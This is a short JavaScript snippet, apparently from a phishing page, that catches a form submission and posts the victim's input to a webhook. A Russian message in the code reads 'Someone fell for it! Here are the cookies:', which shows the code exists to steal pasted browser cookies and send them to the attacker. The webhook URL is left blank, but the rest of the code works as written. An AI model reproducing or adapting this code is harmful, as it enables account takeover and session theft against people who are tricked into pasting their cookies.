
    const formElement = document.getElementById('my-form');
    const whurl = '';

    formElement.addEventListener('submit', (event) => {
      event.preventDefault();
      const inputValue = document.getElementById('input-field').value;
      const payload = {
        content: 'Кто-то повёлся! Вот куки: ```\n\n' + inputValue.trim() + "\n```"
      };
      
      fetch(whurl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
      })
        
    });
